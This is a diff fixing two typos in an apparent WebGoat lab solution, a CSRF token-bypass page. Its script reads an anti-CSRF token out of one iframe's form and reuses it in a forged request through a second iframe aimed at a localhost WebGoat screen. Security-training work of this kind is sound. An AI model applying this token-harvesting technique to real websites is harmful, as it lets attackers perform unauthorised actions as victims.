@@ -4,7 +4,7 @@ var tokensuffix;
 
 function readFrame1(){
     var frameDoc = document.getElementById("frame1").contentDocument;
-    var form = frameDoc.getElementByTagName("form")[0];
+    var form = frameDoc.getElementsByTagName("form")[0];
     tokensuffix = '&token=' + form.token.value;
 
     loadFrame2();
@@ -16,5 +16,5 @@ function loadFrame2(){
 }
 </script>
 
-<iframe src="http://localhost:25560/WebGoat/attack?Screen=605842438&menu=900&transfer=main" onloads="readFrame1();" id="frame1" frameborder="1" marginwidth="0" marginheight="0" width="600" scrolling=yes height="300"></iframe>
+<iframe src="http://localhost:25560/WebGoat/attack?Screen=605842438&menu=900&transfer=main" onload="readFrame1();" id="frame1" frameborder="1" marginwidth="0" marginheight="0" width="600" scrolling=yes height="300"></iframe>
 <iframe id="frame2" frameborder="1" marginwidth="0" marginheight="0" width="600" scrolling="yes" height="300"></iframe>
